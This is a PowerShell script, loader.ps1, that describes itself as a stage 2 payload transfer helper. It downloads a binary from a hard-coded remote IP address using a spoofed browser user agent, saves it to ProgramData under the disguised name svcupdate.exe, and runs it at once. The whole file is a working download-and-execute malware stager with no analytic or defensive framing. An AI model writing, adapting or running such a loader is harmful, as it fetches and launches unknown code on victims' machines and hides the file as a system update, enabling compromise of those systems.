<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\loader.ps1
#>
$RemoteUrl = 'http://203.0.113.134/cdn/stage2.bin'
$WorkingPath = 'C:\ProgramData\svcupdate.exe'
$TransferTimeout = 56
$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-PayloadFetch -SourceUrl $RemoteUrl -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout -UserAgent $BrowserAgent
    if ($TransferResult) {
        Start-Process -FilePath $WorkingPath
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Set-Location -Path $env:TEMP
Write-Verbose "stage marker 45 reached"
